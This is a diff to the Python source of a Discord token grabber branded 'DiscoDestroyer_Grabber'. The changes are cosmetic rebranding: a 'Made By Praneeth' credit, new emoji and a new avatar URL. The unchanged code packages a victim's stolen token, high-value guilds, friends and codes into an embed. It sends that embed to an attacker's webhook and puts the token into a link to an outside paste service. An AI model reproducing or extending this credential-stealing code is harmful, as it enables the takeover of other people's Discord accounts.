@@ -339,7 +339,7 @@ class upload_tokens:
             else:
                 codes = None
 
-            embed = Embed(title=f"{username} ({user_id})", color=0x000000)
+            embed = Embed(title=f"{username} ({user_id}) (Made By Praneeth)", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
@@ -356,11 +356,11 @@ class upload_tokens:
             embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if hq_guilds != None:
-                embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
+                embed.add_field(name="<:zap:> HQ Guilds:", value=hq_guilds, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
            
             if hq_friends != None:
-                embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
+                embed.add_field(name="<:zap:> HQ Friends:", value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if codes != None:
@@ -369,4 +369,4 @@ class upload_tokens:
 
             embed.set_footer(text="Made By Praneeth")
 
-            self.webhook.send(embed=embed, username="DiscoDestroyer_Grabber", avatar_url="https://th.bing.com/th/id/R.0f90396e540161a7645aeccab8e0b3b1?rik=34ESApFeG67eWg&riu=http%3a%2f%2fwww.clipartbest.com%2fcliparts%2fdT6%2fLdk%2fdT6LdkAac.png&ehk=m%2bnTFzuTNOT0H%2flyl0Ne%2fl9r8f8oKP51%2fpYd%2be0BG%2fk%3d&risl=&pid=ImgRaw&r=0")
+            self.webhook.send(embed=embed, username="DiscoDestroyer_Grabber", avatar_url="https://cdn.discordapp.com/icons/1026828285704949831/66c146c4f6d7bb28c375e0b95848652b.png?size=1024")
